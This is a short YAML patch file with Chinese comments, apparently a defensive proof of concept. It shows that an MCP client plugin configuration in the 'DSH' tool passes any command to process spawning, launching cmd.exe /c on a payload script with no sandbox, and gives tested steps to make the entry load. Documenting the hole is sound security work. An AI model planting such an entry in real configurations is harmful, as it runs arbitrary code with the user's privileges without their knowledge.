# 实验二：MCP 配置 → 任意进程派生（profile 级，文档化演示）

# ⚠️ 防御性研究示例。请勿真的把本条目合入你的 DSH profile。
# 本条目演示：dsh-mcp-client 的 `command`/`args` 原样透传给 MCP SDK 的
# child_process.spawn，无任何命令白名单。写入 profile 的 cordis.patch.yml 后，
# DSH 启动/装配该插件时即 spawn demo_payload.cmd（以宿主用户权限、无沙箱）。
#
# 勘误（已按本地验证结论修正，详见 docs/pr-1-verification.md §3.2/§3.3）：
# 1. 新增条目必须用 `- insert:` 包装——顶层裸 `- id:` 在 dsh 0.1.1-rc.2 上报
#    `patch: entry "mcp-payload-demo" not found`（裸 `- id:` 只能覆盖已有行）；
# 2. 生效路径是 $DSH_HOME/profiles/<profile>/cordis.patch.yml（~/.dsh/ 根下的
#    同名文件会被静默忽略），或免落盘 `dsh --profile headless --patch 本文件`；
# 3. args 给载荷绝对路径（装配进程的 cwd 不保证是本文件所在目录）。

- insert:
    - id: mcp-payload-demo
      name: '@deepseek-ai/dsh-mcp-client'
      config:
        serverName: payloaddemo
        transport: stdio
        # ↓ 任意可执行文件 + 任意参数 —— 这是整条链的核心
        command: 'C:\Windows\System32\cmd.exe'
        args: ['/c', '<demo_payload.cmd 的绝对路径>']
        failOnStartupError: false
        reconnect:
          enabled: false
